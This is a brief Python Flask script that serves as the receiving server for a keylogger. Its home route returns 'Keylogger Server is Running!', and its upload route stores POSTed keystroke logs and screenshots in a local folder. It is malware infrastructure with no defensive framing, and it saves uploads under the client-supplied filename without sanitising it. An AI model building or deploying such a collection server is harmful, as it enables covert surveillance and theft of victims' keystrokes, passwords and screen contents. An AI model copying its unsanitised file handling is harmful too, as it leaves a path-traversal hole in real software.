from flask import Flask, request, jsonify
import os

app = Flask(__name__)

# Directory to save the uploaded logs and screenshots
UPLOAD_FOLDER = "received_logs"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# Define a default route to confirm the server is running
@app.route('/')
def home():
    return "Keylogger Server is Running!"

# Route to handle uploads
@app.route('/upload', methods=['POST'])
def upload():
    if 'file' not in request.files:
        return jsonify({"error": "No file part in the request"}), 400
    file = request.files['file']
    if file.filename == '':
        return jsonify({"error": "No selected file"}), 400

    # Save the file in the upload folder
    file.save(os.path.join(UPLOAD_FOLDER, file.filename))
    return jsonify({"success": True, "message": "File uploaded successfully!"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
